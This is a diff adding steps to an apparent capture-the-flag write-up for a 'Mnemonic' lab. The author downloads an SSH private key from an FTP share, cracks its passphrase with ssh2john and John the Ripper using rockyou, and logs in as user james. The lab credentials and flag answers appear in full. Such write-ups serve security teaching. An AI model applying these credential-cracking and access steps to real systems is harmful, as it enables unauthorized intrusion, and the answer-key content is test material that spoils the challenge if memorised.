@@ -263,6 +263,14 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-10 03:05:
 >> <code><strong>james</strong></code><br>
 
 <br>
+<br>
+
+> 3.4. <em>What is the ssh password?</em><a id='3.4'></a>
+>> <code><strong>bluelove</strong></code><br>
+
+<br>
+<br>
+
 
 <h3 align="center">$$\textcolor{white}{\textnormal{ftp --> ftpuser : love4ever}}$$</h3>
 <p align="center"><code>ftpuser</code> : <code>love4ever</code></p>
@@ -299,9 +307,181 @@ drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
 drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
 drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
 226 Directory send OK.
-ftp> 
+ftp> cd data-4
+250 Directory successfully changed.
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    4 0        0            4096 Jul 14  2020 .
+drwx------   12 1003     1003         4096 Jul 14  2020 ..
+drwxr-xr-x    2 0        0            4096 Jul 14  2020 3
+drwxr-xr-x    2 0        0            4096 Jul 14  2020 4
+-rwxr-xr-x    1 1001     1001         1766 Jul 13  2020 id_rsa
+-rwxr-xr-x    1 1000     1000           31 Jul 13  2020 not.txt
+226 Directory send OK.
+ftp> get not.txt
+local: not.txt remote: not.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for not.txt (31 bytes).
+226 Transfer complete.
+31 bytes received in 0.01 secs (5.0897 kB/s)
+ftp> get id_rsa
+local: id_rsa remote: id_rsa
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for id_rsa (1766 bytes).
+226 Transfer complete.
+1766 bytes received in 0.00 secs (2.1211 MB/s)
+ftp> exit
+
+...
+
+root@ip-10-10-26-50:~/Mnemonic# cat not.txt
+james change ftp user password
+root@ip-10-10-26-50:~/Mnemonic# chmod +x id_rsa
+root@ip-10-10-26-50:~/Mnemonic# ls
+backups.zip  id_rsa  not.txt
+root@ip-10-10-26-50:~/Mnemonic# ssh -p 1337 -i id_rsa james@10.10.229.90
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0755 for 'id_rsa' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "id_rsa": bad permissions
+james@10.10.229.90's password:
+
+...
+
+:~/Mnemonic# locate ssh2john
+/opt/john/ssh2john.py
+root@ip-10-10-26-50:~/Mnemonic# python2 /opt/john/ssh2john.py id_rsa > hash
+root@ip-10-10-26-50:~/Mnemonic# ls
+backups.zip  hash  id_rsa  not.txt
+root@ip-10-10-26-50:~/Mnemonic# john --worddlist=/usr/share/wordlists/rockyou.txt hash
+Unknown option: "--worddlist=/usr/share/wordlists/rockyou.txt"
+root@ip-10-10-26-50:~/Mnemonic# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Note: This format may emit false positives, so it will keep trying even after finding a
+possible candidate.
+Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
+Use the "--format=ssh-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bluelove         (id_rsa)
+1g 0:00:00:10 DONE (2025-05-10 23:11) 0.09842g/s 1411Kp/s 1411Kc/s 1411KC/s *7¡Vamos!
+Session completed. 
+root@ip-10-10-26-50:~/Mnemonic# 
+
+...
+
+:~/Mnemonic# ssh -p 1337 james@10.10.229.90
+james@10.10.229.90's password: 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat May 10 22:17:53 UTC 2025
+
+  System load:  0.08               Processes:           94
+  Usage of /:   34.0% of 12.01GB   Users logged in:     0
+  Memory usage: 16%                IP address for eth0: 10.10.229.90
+  Swap usage:   0%
+
+  => There is 1 zombie process.
+
+
+51 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Thu Jul 23 20:40:09 2020 from 192.168.1.5
+
+james@mnemonic:~$ pwd
+/home/james
+james@mnemonic:~$ ls -la
+total 44
+drwx------  6 james james 4096 Jul 14  2020 .
+drwxr-xr-x 10 root  root  4096 Jul 14  2020 ..
+-rw-r--r--  1 vill  vill   116 Jul 14  2020 6450.txt
+lrwxrwxrwx  1 james james    9 Jul 14  2020 .bash_history -> /dev/null
+-rw-r--r--  1 james james  220 Jul 13  2020 .bash_logout
+-rw-r--r--  1 james james 3771 Jul 13  2020 .bashrc
+drwx------  2 james james 4096 Jul 13  2020 .cache
+drwx------  3 james james 4096 Jul 13  2020 .gnupg
+drwxrwxr-x  3 james james 4096 Jul 13  2020 .local
+-rw-r--r--  1 vill  vill   155 Jul 13  2020 noteforjames.txt
+-rw-r--r--  1 james james  807 Jul 13  2020 .profile
+drwx------  2 james james 4096 Jul 13  2020 .ssh
+james@mnemonic:~$ cat 6450.txt
+5140656
+354528
+842004
+1617534
+465318
+1617534
+509634
+1152216
+753372
+265896
+265896
+15355494
+24617538
+3567438
+15355494
+james@mnemonic:~$ cat noteforjames.txt
+noteforjames.txt
+
+@vill
+
+james i found a new encryption \u0130mage based name is Mnemonic  
+
+I created the condor password. don't forget the beers on saturday
+                                                                               
+Broadcast message from root@mnemonic (somewhere) (Sat May 10 22:18:20 2025):   
+                                                                               
+     IPS/IDS SYSTEM ON !!!!                                                    
+ **     *     ****  **                                                         
+         * **      *  * *                                                      
+*   ****                 **                                                    
+ *                                                                             
+    * *            *                                                           
+       *                  *                                                    
+         *               *                                                     
+        *   *       **                                                         
+* *        *            *                                                      
+              ****    *                                                        
+     *        ****                                                             
+                                                                               
+ Unauthorized access was detected.                         
+james@mnemonic:~$ ls -la
+total 44
+drwx------  6 james james 4096 Jul 14  2020 .
+drwxr-xr-x 10 root  root  4096 Jul 14  2020 ..
+-rw-r--r--  1 vill  vill   116 Jul 14  2020 6450.txt
+lrwxrwxrwx  1 james james    9 Jul 14  2020 .bash_history -> /dev/null
+-rw-r--r--  1 james james  220 Jul 13  2020 .bash_logout
+-rw-r--r--  1 james james 3771 Jul 13  2020 .bashrc
+drwx------  2 james james 4096 Jul 13  2020 .cache
+drwx------  3 james james 4096 Jul 13  2020 .gnupg
+drwxrwxr-x  3 james james 4096 Jul 13  2020 .local
+-rw-r--r--  1 vill  vill   155 Jul 13  2020 noteforjames.txt
+-rw-r--r--  1 james james  807 Jul 13  2020 .profile
+drwx------  2 james james 4096 Jul 13  2020 .ssh
+james@mnemonic:~$ 
+
+
 
 ```
+
+<br>
+<br>
+
+
 
 <br>
 
